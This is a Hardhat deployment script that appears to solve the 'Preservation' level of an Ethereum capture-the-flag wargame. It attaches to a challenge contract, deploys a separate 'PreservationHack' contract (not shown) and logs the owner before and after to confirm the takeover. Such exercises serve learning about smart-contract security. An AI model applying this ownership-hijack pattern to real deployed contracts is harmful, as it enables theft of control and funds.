// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
    // Gate 2 is damn tricky. After wasting sometime, decided to pick this level later
    const INSTANCE_ADDRESS = '0xA210b61fc7BAB9FE5c04a9dfe9543f71d6FAD919';
    const [owner, addr1] = await ethers.getSigners();

    const Preservation = await hre.ethers.getContractFactory("Preservation");
    const preservation = Preservation.attach(INSTANCE_ADDRESS);

    console.log(await preservation.owner())
    console.log(await preservation.timeZone1Library())

    let PreservationHack = await hre.ethers.getContractFactory("PreservationHack");
    let preservationHack = await PreservationHack.deploy(preservation.address);
    await preservationHack.deployed();
    console.log(`preservationHack deployed on ${preservationHack.address}`);

    console.log(await preservation.owner())
    console.log(await preservation.timeZone1Library())
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
